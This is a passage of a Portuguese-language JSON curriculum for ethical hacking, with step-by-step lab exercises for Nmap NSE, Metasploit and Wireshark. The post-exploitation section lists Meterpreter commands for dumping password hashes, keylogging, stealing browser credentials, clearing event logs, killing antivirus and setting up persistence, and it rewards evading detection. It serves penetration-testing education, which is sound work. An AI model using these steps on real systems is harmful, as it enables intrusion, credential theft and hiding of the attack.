                                "Interpreta XML de saída Nmap corretamente.",
                                "Customiza script-args para um NSE específico.",
                                "Valida resultados sem falsos positivos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de serviços/versões (90%+ match).",
                                "Identificação correta de vulns com CVEs associados.",
                                "Efetividade de evasão (scan completo sem detecção).",
                                "Análise qualitativa da saída NSE.",
                                "Tempo de execução otimizado (<10min para scan médio).",
                                "Relatório claro com evidências."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entendimento de portas, protocolos e firewalls.",
                                "Programação: Scripts NSE em Lua para customizações.",
                                "Análise de Malware: Detecção de backdoors via NSE.",
                                "Ética e Direito: Uso legal de ethical hacking.",
                                "Gestão de Riscos: Avaliação de CVEs e priorização."
                              ],
                              "realWorldApplication": "Em pentests profissionais, use NSE para reconnaissance rápida em redes corporativas, detectando vulns como Heartbleed ou Log4Shell sem alertar SIEM, acelerando fases de exploração em Red Team operations."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.1.2",
                        "name": "Metasploit Framework",
                        "description": "Plataforma para desenvolvimento e execução de exploits éticos, auxiliando na exploração de vulnerabilidades identificadas em fases anteriores.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.2.1",
                            "name": "Iniciação e Navegação no Metasploit",
                            "description": "Iniciar o msfconsole, explorar módulos (exploits, payloads, auxiliaries) e usar comandos básicos como search, use e show options.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Iniciar o Metasploit Console (msfconsole)",
                                  "subSteps": [
                                    "Abra o terminal em um ambiente Linux compatível como Kali Linux.",
                                    "Verifique se o Metasploit está instalado com 'msfvenom --version'.",
                                    "Digite 'msfconsole' e pressione Enter para iniciar.",
                                    "Aguarde o carregamento dos banners e espere o prompt 'msf6 >' aparecer.",
                                    "Confirme a inicialização executando 'getuid' para verificar privilégios."
                                  ],
                                  "verification": "O prompt 'msf6 >' é exibido sem erros e 'getuid' retorna o usuário atual.",
                                  "estimatedTime": "5-10 minutos",
                                  "materials": [
                                    "Kali Linux ou máquina virtual com Metasploit instalado",
                                    "Acesso root ou sudo"
                                  ],
                                  "tips": "Use 'sudo msfconsole' se houver problemas de permissão; atualize com 'msfupdate' antes.",
                                  "learningObjective": "Dominar a inicialização da interface principal do Metasploit Framework.",
                                  "commonMistakes": [
                                    "Executar sem privilégios adequados",
                                    "Ignorar dependências ausentes",
                                    "Confundir com msfvenom"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Comandos Básicos e Ajuda no msfconsole",
                                  "subSteps": [
                                    "Digite 'help' para listar todos os comandos disponíveis.",
                                    "Execute 'show banners' para visualizar informações do framework.",
                                    "Use 'version' para checar a versão instalada.",
                                    "Digite 'info' sem argumentos para visão geral ou com módulo para detalhes.",
                                    "Pratique 'exit' para sair e reinicie o console para reforçar."
                                  ],
                                  "verification": "Lista completa de comandos é exibida e banners/version são mostrados corretamente.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Terminal com msfconsole ativo"
                                  ],
                                  "tips": "Use 'help <comando>' para ajuda específica, como 'help search'; memorize core commands como help, show, use.",
                                  "learningObjective": "Familiarizar-se com a interface de linha de comando e comandos de navegação essenciais.",
                                  "commonMistakes": [
                                    "Não explorar subcomandos",
                                    "Sair acidentalmente sem salvar contexto",
                                    "Ignorar banners informativos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Buscar Módulos Usando o Comando 'search'",
                                  "subSteps": [
                                    "Digite 'search type:exploit' para listar módulos de exploit.",
                                    "Execute 'search type:payload' para payloads.",
                                    "Use 'search type:auxiliary' para módulos auxiliares.",
                                    "Refine com 'search eternalblue' ou 'search smb' para exemplos específicos.",
                                    "Anote caminhos de 2-3 módulos relevantes (ex: exploit/windows/smb/ms17_010_eternalblue)."
                                  ],
                                  "verification": "Resultados filtrados por tipo e keyword são listados com paths corretos.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "msfconsole ativo",
                                    "Conhecimento básico de vulnerabilidades comuns"
                                  ],
                                  "tips": "Use aspas para frases exatas; filtre por plataforma com 'search windows'; salve buscas frequentes em aliases.",
                                  "learningObjective": "Aprender a localizar módulos eficientemente por categoria e relevância.",
                                  "commonMistakes": [
                                    "Buscar sem filtros levando a sobrecarga de resultados",
                                    "Confundir tipos de módulos",
                                    "Erros de digitação em keywords"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Selecionar Módulos e Explorar Opções",
                                  "subSteps": [
                                    "Digite 'use <path_do_modulo>' ex: 'use exploit/windows/smb/ms17_010_eternalblue'.",
                                    "Execute 'show options' para visualizar configurações requeridas.",
                                    "Use 'show payloads' para listar payloads compatíveis.",
                                    "Execute 'show targets' para alvos suportados e 'show advanced' para opções extras.",
                                    "Defina uma opção de teste com 'set RHOSTS 192.168.1.100' (use lab IP)."
                                  ],
                                  "verification": "Módulo é carregado, opções/payloads/targets são exibidos e uma opção é setada com sucesso.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "msfconsole com módulos buscados",
                                    "IP de máquina lab para teste (ex: Metasploitable)"
                                  ],
                                  "tips": "Sempre cheque 'Required: yes' em options; use 'unset' para limpar; backtrack com 'back' para sair do módulo.",
                                  "learningObjective": "Configurar e preparar módulos para uso em cenários simulados.",
                                  "commonMistakes": [
                                    "Não setar RHOSTS/LHOST",
                                    "Selecionar payloads incompatíveis",
                                    "Ignorar opções required"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Metasploitable 2 (IP 192.168.1.100), inicie msfconsole, busque 'search ms17_010', use o exploit eternalblue, show options, set RHOSTS 192.168.1.100 e prepare payload windows/x64/meterpreter/reverse_tcp para simular uma exploração ética.",
                              "finalVerifications": [
                                "msfconsole inicia e responde ao prompt sem erros.",
                                "Comandos 'help', 'show banners' e 'version' funcionam perfeitamente.",
                                "Buscas por 'type:exploit', 'payload' e keyword específica retornam resultados relevantes.",
                                "Módulo é selecionado com 'use', e 'show options/payloads/targets' exibe detalhes.",
                                "Opções básicas como RHOSTS são setadas e verificadas com 'show options'.",
                                "Navegação com 'back' e 'exit' é fluida."
                              ],
                              "assessmentCriteria": [
                                "Precisão e velocidade na execução de comandos básicos (sem erros de sintaxe).",
                                "Capacidade de filtrar e identificar módulos corretos em buscas.",
                                "Compreensão e configuração correta de opções required em um módulo.",
                                "Explicação clara das diferenças entre exploits, payloads e auxiliaries.",
                                "Uso responsável: menciona necessidade de autorização em targets.",
                                "Tempo total para completar todos steps abaixo de 60 minutos."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Identificação de serviços vulneráveis como SMB (porta 445).",
                                "Sistemas Operacionais: Comandos Linux/terminal e privilégios root.",
                                "Programação: Entendimento de módulos Ruby e payloads shellcode.",
                                "Ética e Direito: Conceitos de ethical hacking, autorização e leis de cibersegurança.",
                                "Análise de Vulnerabilidades: Conexão com CVEs como MS17-010 (EternalBlue)."
                              ],
                              "realWorldApplication": "Em operações de ethical hacking e red teaming, profissionais usam Metasploit para reconnaissance rápida de vulnerabilidades em pentests autorizados, simulando ataques reais em labs ou ambientes de produção para fortalecer defesas cibernéticas em empresas e governos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.2.2",
                            "name": "Configuração e Execução de Exploits",
                            "description": "Configurar payloads (Meterpreter), definir RHOSTS/LHOST e executar exploits contra alvos vulneráveis em ambiente controlado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente Metasploit",
                                  "subSteps": [
                                    "Inicie o Metasploit Framework usando 'msfconsole' no terminal Kali Linux.",
                                    "Verifique a conectividade de rede entre o atacante (LHOST) e o alvo (RHOST) com ping.",
                                    "Atualize a base de exploits com 'msfupdate' se necessário.",
                                    "Liste exploits disponíveis com 'search' para identificar módulos relevantes.",
                                    "Configure o workspace com 'workspace -a nome_projeto' para organização."
                                  ],
                                  "verification": "Confirme que o msfconsole está rodando e responde a comandos básicos como 'help' sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Kali Linux VM, terminal, rede isolada com VMs alvo (ex: Metasploitable).",
                                  "tips": "Use uma rede isolada (ex: VirtualBox Host-Only) para evitar impactos reais.",
                                  "learningObjective": "Entender a inicialização e configuração básica do Metasploit para simulações seguras.",
                                  "commonMistakes": "Executar sem rede isolada, expondo a internet; esquecer de atualizar módulos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Selecionar e Carregar o Exploit",
                                  "subSteps": [
                                    "Pesquise exploits com 'search tipo_vulnerabilidade' (ex: 'search eternalblue').",
                                    "Use 'use exploit/windows/smb/ms17_010_eternalblue' para carregar o módulo.",
                                    "Exiba informações do exploit com 'info' para entender requisitos.",
                                    "Verifique opções disponíveis com 'show options'.",
                                    "Defina payloads compatíveis iniciais com 'show payloads'."
                                  ],
                                  "verification": "O prompt do msfconsole muda para o exploit selecionado e 'show options' lista configurações corretas.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Msfconsole aberto, lista de vulnerabilidades conhecidas do alvo.",
                                  "tips": "Escolha exploits com alta confiabilidade (ranking 'excellent') para iniciantes.",
                                  "learningObjective": "Aprender a navegar e selecionar módulos de exploit adequados ao alvo.",
                                  "commonMistakes": "Selecionar exploit incompatível com o SO do alvo; ignorar pré-requisitos como portas abertas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar o Payload Meterpreter",
                                  "subSteps": [
                                    "Defina o payload com 'set payload windows/meterpreter/reverse_tcp'.",
                                    "Verifique compatibilidade com o exploit usando 'show payloads'.",
                                    "Configure opções do payload como LPORT se necessário.",
                                    "Mostre opções avançadas com 'show advanced' e ajuste se preciso.",
                                    "Salve configurações com 'save' para reutilização."
                                  ],
                                  "verification": "Comando 'show options' exibe payload Meterpreter corretamente configurado.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Exploit carregado, conhecimento de arquitetura do alvo (x86/x64).",
                                  "tips": "Prefira reverse payloads para firewalls comuns em cenários reais.",
                                  "learningObjective": "Dominar configuração de payloads avançados como Meterpreter para shells interativos.",
                                  "commonMistakes": "Mismatch de arquitetura (32bit vs 64bit); usar bind payloads em NAT."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Definir Hosts e Opções Finais",
                                  "subSteps": [
                                    "Defina RHOSTS com 'set RHOSTS IP_DO_ALVO' (ex: 192.168.1.100).",
                                    "Configure LHOST com 'set LHOST SEU_IP' (ex: 192.168.1.50).",
                                    "Ajuste outras opções como RPORT, THREADS para otimização.",
                                    "Verifique todas as opções com 'show options' e confirme 'yes' em Required.",
                                    "Teste conectividade com 'check' se o módulo suportar."
                                  ],
                                  "verification": "Todas as opções obrigatórias estão preenchidas e marcadas como 'yes' em 'show options'.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "IPs confirmados via nmap ou ping, scanner de portas prévio.",
                                  "tips": "Use nmap para confirmar serviço vulnerável antes (ex: nmap -sV IP).",
                                  "learningObjective": "Configurar parâmetros de rede essenciais para execução bem-sucedida.",
                                  "commonMistakes": "IPs trocados (RHOST/LHOST); portas incorretas sem verificação prévia."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Executar o Exploit e Gerenciar Sessões",
                                  "subSteps": [
                                    "Execute com 'exploit' ou 'run' para lançar o ataque.",
                                    "Monitore saída por sessões abertas (Meterpreter shell).",
                                    "Interaja com sessão via 'sessions -i ID'.",
                                    "Execute comandos básicos no Meterpreter (sysinfo, getuid).",
                                    "Feche sessões com 'sessions -k ID' e saia com 'exit'."
                                  ],
                                  "verification": "Sessão Meterpreter ativa com comandos respondendo corretamente.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Alvo vulnerável rodando (ex: DVWA, Metasploitable).",
                                  "tips": "Use 'exploit -j' para background e múltiplos ataques.",
                                  "learningObjective": "Executar exploits e post-explotar com shells persistentes.",
                                  "commonMistakes": "Executar sem permissões ASLR/DEP mitigadas; ignorar timeouts."
                                }
                              ],
                              "practicalExample": "Em uma VM Metasploitable 2 (IP 192.168.56.102), use msfconsole para 'use exploit/unix/webapp/php_xmlrpc_eval', set payload php/meterpreter/reverse_tcp, RHOSTS 192.168.56.102, LHOST 192.168.56.101, execute 'exploit' e obtenha shell Meterpreter para comandos como 'ls' e 'whoami'.",
                              "finalVerifications": [
                                "Exploit executado sem erros de configuração.",
                                "Sessão Meterpreter estabelecida e interativa.",
                                "Comandos básicos (sysinfo, getuid, pwd) funcionam na sessão.",
                                "Nenhuma detecção por AV/EDR no ambiente simulado.",
                                "Sessão pode ser mantida por pelo menos 5 minutos.",
                                "Logs do Metasploit salvos para análise."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de RHOST/LHOST/payload (100% match).",
                                "Tempo de execução dentro do estimado com sucesso na primeira tentativa.",
                                "Demonstração de comandos Meterpreter sem falhas.",
                                "Identificação e correção de erros comuns durante o processo.",
                                "Relato de verificações finais com evidências (screenshots/logs).",
                                "Uso seguro em ambiente isolado sem vazamentos."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de TCP/IP, portas e NAT para LHOST/RHOST.",
                                "Sistemas Operacionais: Comandos Linux/Windows no Meterpreter.",
                                "Programação: Scripts Ruby personalizados em módulos Metasploit.",
                                "Análise de Vulnerabilidades: Integração com Nmap/Enumeração prévia.",
                                "Ética e Direito: Discussão de leis de ethical hacking (ex: CFAA)."
                              ],
                              "realWorldApplication": "Em pentests profissionais, configurações idênticas são usadas em Red Team Operations para simular ataques APT contra infraestruturas vulneráveis, permitindo identificação de fraquezas antes de exploits maliciosos reais, como em CTFs ou certificações OSCP/CEH."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.2.1"
                            ]
                          },
                          {
                            "id": "10.1.6.1.2.3",
                            "name": "Gerenciamento de Sessões Pós-Exploração",
                            "description": "Manter sessões ativas com Meterpreter, executar comandos para escalonamento de privilégios e coleta de informações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Listar e Selecionar Sessões Meterpreter Ativas",
                                  "subSteps": [
                                    "Inicie o msfconsole no terminal do Kali Linux.",
                                    "Execute o comando 'sessions -l' para listar todas as sessões ativas.",
                                    "Identifique a sessão Meterpreter desejada pelo ID e tipo (ex: meterpreter x64/windows).",
                                    "Use 'sessions -i <ID>' para interagir com a sessão específica.",
                                    "Confirme a conexão executando 'getuid' para verificar o usuário atual."
                                  ],
                                  "verification": "Sessão listada corretamente e comando 'getuid' retorna usuário sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Kali Linux com Metasploit instalado",
                                    "msfconsole",
                                    "Máquina alvo com sessão ativa"
                                  ],
                                  "tips": "Sempre verifique o tipo de arquitetura (x86/x64) para evitar incompatibilidades em payloads.",
                                  "learningObjective": "Compreender como visualizar e acessar múltiplas sessões pós-exploração no Metasploit.",
                                  "commonMistakes": [
                                    "Esquecer de usar 'sessions -i' em vez de apenas selecionar",
                                    "Confundir IDs de sessões shell vs meterpreter",
                                    "Não verificar se a sessão está viva antes de interagir"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estabilizar e Manter Sessões Ativas",
                                  "subSteps": [
                                    "Coloque a sessão em background com 'Ctrl + Z' ou 'background'.",
                                    "Configure timers de keep-alive com 'set AutoRunScript post/multi/manage/shell_to_meterpreter'.",
                                    "Execute 'run post/multi/manage/autoroute' para roteamento automático se necessário.",
                                    "Monitore estabilidade com 'sessions -l -v' periodicamente.",
                                    "Reative a sessão com 'sessions -i <ID>' quando pronto para comandos."
                                  ],
                                  "verification": "Sessão permanece ativa por 10 minutos sem desconexão, confirmada por 'sessions -l'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "msfconsole ativo",
                                    "Script de monitoramento de rede opcional como netstat"
                                  ],
                                  "tips": "Use 'setg' para configurações globais que persistem entre sessões.",
                                  "learningObjective": "Aprender técnicas para manter sessões Meterpreter estáveis durante operações prolongadas.",
                                  "commonMistakes": [
                                    "Deixar sessões em foreground bloqueando o console",
                                    "Ignorar firewalls que matam sessões TCP",
                                    "Não configurar autoroute para pivoting futuro"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Escalonamento de Privilégios",
                                  "subSteps": [
                                    "Verifique privilégios atuais com 'getuid' e 'getsystem' para teste rápido.",
                                    "Carregue módulos necessários: 'use exploit/windows/local/bypassuac' ou 'use post/windows/escalate/<modulo>'.",
                                    "Configure opções como LHOST/LPORT e execute 'run' ou 'exploit'.",
                                    "Monitore saída para sucesso e confirme com 'getuid' pós-escalonamento.",
                                    "Se falhar, tente alternativas como 'hashdump' para passes-the-hash."
                                  ],
                                  "verification": "Comando 'getuid' retorna 'NT AUTHORITY\\SYSTEM' ou equivalente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Módulos Metasploit para escalonamento (ex: getsystem, bypassuac)",
                                    "Lista de exploits locais compatíveis"
                                  ],
                                  "tips": "Sempre teste em ambiente controlado; use 'check' em módulos quando disponível.",
                                  "learningObjective": "Dominar comandos e módulos para elevar privilégios em sessões Meterpreter.",
                                  "commonMistakes": [
                                    "Executar escalonamento sem verificar compatibilidade de OS",
                                    "Ignorar AV/EDR que detecta getsystem",
                                    "Não salvar sessão após sucesso"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Realizar Coleta de Informações Sensíveis",
                                  "subSteps": [
                                    "Execute 'hashdump' para extrair hashes de SAM.",
                                    "Use 'screenshot' ou 'keyscan_start' para capturas e keylogging.",
                                    "Colete credenciais com 'search -f *.txt' e 'download /path'.",
                                    "Dump credenciais de navegadores: 'run post/windows/gather/enum_chrome'.",
                                    "Salve dados localmente com 'upload' para análise posterior."
                                  ],
                                  "verification": "Hashes ou arquivos coletados são acessíveis e legíveis no host atacante.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Post-modules para enumeração (ex: enum_chrome, mimikatz)",
                                    "Espaço de armazenamento no Kali"
                                  ],
                                  "tips": "Combine com 'migrate' para processar em processo legítimo e evitar detecção.",
                                  "learningObjective": "Extrair dados valiosos de forma eficiente sem comprometer a sessão.",
                                  "commonMistakes": [
                                    "Coletar sem filtrar dados sensíveis desnecessários",
                                    "Esquecer de parar keyscan com 'keyscan_stop'",
                                    "Download de arquivos grandes sem compressão"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Aplicar Boas Práticas de Gerenciamento e Limpeza",
                                  "subSteps": [
                                    "Migre a sessão: 'ps', selecione PID e 'migrate <PID>'.",
                                    "Limpe traces: 'clearev' e 'run post/windows/manage/killav'.",
                                    "Configure persistência se necessário: 'run persistence'.",
                                    "Registre ações em log: 'set LogLevel 3'.",
                                    "Finalize com 'exit' ou 'sessions -K' para kill all."
                                  ],
                                  "verification": "Sessão migrada roda em processo estável; logs mostram ações sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Módulos de cleanup e persistence",
                                    "Ferramenta de log review como journalctl"
                                  ],
                                  "tips": "Em pentests reais, documente tudo para relatório; evite persistência sem autorização.",
                                  "learningObjective": "Implementar gerenciamento seguro e stealth para operações pós-exploração.",
                                  "commonMistakes": [
                                    "Migrar para PID instável",
                                    "Não limpar event logs expondo atividade",
                                    "Deixar persistência ativa em labs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Metasploit no Kali atacando uma VM Windows 7 vulnerável via EternalBlue (ms17_010_eternalblue), após shell, upgrade para meterpreter. Liste sessões, estabilize com background, escale para SYSTEM via getsystem, colete hashes com hashdump e screenshot do desktop, migrando para explorer.exe para stealth.",
                              "finalVerifications": [
                                "Lista e interage com múltiplas sessões sem perda.",
                                "Mantém sessão ativa por 30+ minutos com comandos contínuos.",
                                "Escala privilégios com sucesso em 80% dos casos testados.",
                                "Coleta hashes, screenshots e creds de browsers sem crash.",
                                "Migra sessão e limpa traces efetivamente.",
                                "Registra todas ações em logs auditáveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão e velocidade na listagem/interação de sessões (90% sucesso).",
                                "Estabilidade da sessão mantida sem desconexões inesperadas.",
                                "Eficiência no escalonamento (tempo <5min por tentativa).",
                                "Completude da coleta de dados (mínimo 5 tipos de info).",
                                "Stealth: Sem detecção por ferramentas básicas como Process Explorer.",
                                "Documentação clara de comandos executados."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de TCP keep-alives e pivoting via autoroute.",
                                "Sistemas Operacionais: Conhecimento de privilégios Windows/Linux.",
                                "Programação: Customização de post-modules em Ruby.",
                                "Forense Digital: Análise de logs e detecção de IOCs pós-ação.",
                                "Ética e Direito: Conformidade com regras de engajamento em pentests."
                              ],
                              "realWorldApplication": "Em simulações de Red Team ou pentests autorizados, permite pentesters manterem acesso stealth em redes corporativas para mapear defesas, coletar evidências de vulnerabilidades e demonstrar impactos reais sem causar downtime."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.1.3",
                        "name": "Wireshark",
                        "description": "Analisador de pacotes para captura e inspeção de tráfego de rede, essencial para reconnaissance passiva e análise durante explorações éticas.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.3.1",
                            "name": "Instalação e Captura Inicial de Pacotes",
                            "description": "Instalar o Wireshark, selecionar interfaces de rede e iniciar capturas básicas, salvando em formato PCAP para análise posterior.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Baixar e Instalar o Wireshark",
                                  "subSteps": [
                                    "Acesse o site oficial do Wireshark (wireshark.org)",
                                    "Selecione a versão compatível com seu sistema operacional (Windows, macOS ou Linux)",
                                    "Baixe o instalador estável mais recente",
                                    "Execute o instalador e siga as instruções na tela, incluindo a instalação do WinPcap/Npcap para Windows",
                                    "Reinicie o computador se solicitado para ativar os drivers de captura"
                                  ],
                                  "verification": "Abra o Wireshark e verifique se a interface principal carrega sem erros, listando interfaces de rede disponíveis",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Computador com acesso à internet",
                                    "Espaço em disco de pelo menos 500MB"
                                  ],
                                  "tips": "Sempre baixe do site oficial para evitar malware; opte pela instalação completa para incluir filtros e plugins",
                                  "learningObjective": "Entender o processo de instalação segura e configuração inicial de drivers de captura de pacotes",
                                  "commonMistakes": [
                                    "Baixar de fontes não oficiais",
                                    "Não instalar Npcap/WinPcap",
                                    "Ignorar reinicialização"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Iniciar o Wireshark e Configurar Preferências Básicas",
                                  "subSteps": [
                                    "Abra o Wireshark pelo menu de aplicativos ou atalho de desktop",
                                    "Vá para Edit > Preferences e habilite 'Capture > Automatically save capture files' se desejar",
                                    "Configure o diretório de salvamento de capturas em uma pasta dedicada",
                                    "Verifique as interfaces de rede listadas na tela inicial (double-click para atualizar)",
                                    "Ajuste a linguagem para Português se disponível nas preferências"
                                  ],
                                  "verification": "A interface principal mostra lista de interfaces sem erros vermelhos e preferências salvas corretamente",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Wireshark instalado"
                                  ],
                                  "tips": "Use Ctrl+Shift+P para abrir preferências rapidamente; ative 'Promiscuous mode' apenas se necessário para redes locais",
                                  "learningObjective": "Familiarizar-se com a interface e configurações iniciais para uso eficiente",
                                  "commonMistakes": [
                                    "Não atualizar lista de interfaces",
                                    "Salvar capturas em locais protegidos",
                                    "Ignorar permissões de administrador"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Selecionar Interface de Rede e Iniciar Captura Básica",
                                  "subSteps": [
                                    "Na tela inicial, selecione a interface ativa (ex: Wi-Fi ou Ethernet) clicando duas vezes nela",
                                    "Defina um filtro de captura simples como 'http' no campo Capture Filter para focar em tráfego web",
                                    "Clique em 'Start' para iniciar a captura; gere tráfego abrindo sites no navegador",
                                    "Monitore o gráfico de tráfego e contadores de pacotes em tempo real",
                                    "Pare a captura clicando no botão vermelho 'Stop' após 30-60 segundos"
                                  ],
                                  "verification": "Pacotes são capturados e exibidos na lista principal com detalhes como origem, destino e protocolo",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Conexão de rede ativa",
                                    "Navegador web"
                                  ],
                                  "tips": "Use loopback (lo) para testes iniciais sem expor rede real; filtros reduzem ruído",
                                  "learningObjective": "Dominar seleção de interfaces e captura de tráfego em tempo real",
                                  "commonMistakes": [
                                    "Selecionar interface errada/inativa",
                                    "Não aplicar filtros levando a sobrecarga",
                                    "Executar sem privilégios de admin"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Salvar e Exportar a Captura em Formato PCAP",
                                  "subSteps": [
                                    "Com a captura parada, vá para File > Save As",
                                    "Escolha o formato 'Wireshark/tcpdump/... - pcap' (libpcap)",
                                    "Nomeie o arquivo com timestamp (ex: captura_http_2023-10-01.pcap)",
                                    "Salve em pasta dedicada e verifique o tamanho do arquivo (>0 bytes)",
                                    "Reabra o arquivo via File > Open para validar integridade"
                                  ],
                                  "verification": "Arquivo PCAP reabre corretamente no Wireshark mostrando os pacotes capturados",
                                  "estimatedTime": "5-10 minutos",
                                  "materials": [
                                    "Captura realizada"
                                  ],
                                  "tips": "Use .pcapng para metadados extras se disponível; comprima arquivos grandes com gzip",
                                  "learningObjective": "Aprender a salvar capturas de forma padronizada para análise posterior",
                                  "commonMistakes": [
                                    "Salvar em formato errado (.wireshark)",
                                    "Sobrescrever arquivos existentes",
                                    "Não validar reabertura"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de ethical hacking, instale Wireshark em uma VM Ubuntu, capture tráfego HTTP de um navegador acessando example.com na interface enp0s3, aplique filtro 'http', pare após 1 minuto e salve como 'teste_http.pcap' para análise de headers em um exercício de detecção de vazamento de dados.",
                              "finalVerifications": [
                                "Wireshark inicia sem erros e lista interfaces corretamente",
                                "Captura básica captura pelo menos 50 pacotes de tráfego real",
                                "Arquivo PCAP salvo é reabrido com todos pacotes intactos",
                                "Filtros de captura aplicados reduzem ruído efetivamente",
                                "Tempo total de execução abaixo de 1 hora",
                                "Nenhuma violação de permissões ou crashes durante o processo"
                              ],
                              "assessmentCriteria": [
                                "Instalação completa sem prompts de erro (100%)",
                                "Captura inicia em <10s e para responsivamente",
                                "Arquivo PCAP válido e legível em Wireshark/tshark",
                                "Uso correto de pelo menos um filtro de captura",
                                "Documentação de 3+ pacotes analisados (protocolo, origem/destino)",
                                "Tempo estimado respeitado com eficiência"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender camadas OSI e protocolos TCP/IP",
                                "Programação: Automatizar capturas via TShark em scripts Python",
                                "Análise de Dados: Filtrar e visualizar pacotes como datasets",
                                "Sistemas Operacionais: Gerenciar privilégios e drivers de rede"
                              ],
                              "realWorldApplication": "Em operações de ethical hacking e jogos de guerra cibernética, profissionais usam Wireshark para capturar e analisar tráfego de rede em incidentes reais, como detecção de intrusões, análise de malware C2 ou auditorias de conformidade PCI-DSS, salvando PCAPs para relatórios forenses e compartilhamento com equipes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.3.2",
                            "name": "Aplicação de Filtros de Captura e Exibição",
                            "description": "Criar filtros display (ex: http, tcp.port==80) e capture filters para focar em protocolos específicos, reduzindo ruído na análise.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a Sintaxe Básica de Filtros de Display e Captura",
                                  "subSteps": [
                                    "Acessar a documentação oficial do Wireshark (Display Filter Reference e Capture Filter Syntax).",
                                    "Identificar diferenças: display filters aplicados pós-captura (mais poderosos, baseados em protocolo); capture filters pré-captura (BPF syntax, mais simples).",
                                    "Estudar exemplos comuns: display 'http', 'tcp.port==80'; capture 'tcp port 80'.",
                                    "Listar 5 protocolos comuns (HTTP, TCP, UDP, ICMP, DNS) e seus filtros equivalentes.",
                                    "Testar sintaxe inválida no Wireshark para reconhecer erros."
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito a diferença entre os dois tipos de filtros e listar 5 exemplos válidos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Documentação Wireshark online",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use a barra de filtro no Wireshark e observe a cor: verde = válido, vermelho = erro de sintaxe.",
                                  "learningObjective": "Dominar a sintaxe fundamental e diferenças entre display e capture filters.",
                                  "commonMistakes": [
                                    "Confundir sintaxe BPF (capture) com display filters",
                                    "Usar aspas duplas em vez de == para portas",
                                    "Ignorar case-sensitivity em protocolos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aplicar Filtros de Display em Capturas Existentes",
                                  "subSteps": [
                                    "Abrir um arquivo PCAP de exemplo com tráfego misto (ex: sample.pcap do Wireshark).",
                                    "Aplicar filtro simples 'http' e observar redução de pacotes.",
                                    "Refinar com 'tcp.port==80 or tcp.port==443' para tráfego web.",
                                    "Usar filtros compostos: 'ip.src==192.168.1.1 and http.request'.",
                                    "Limpar filtro com 'Clear' e comparar visualmente antes/depois."
                                  ],
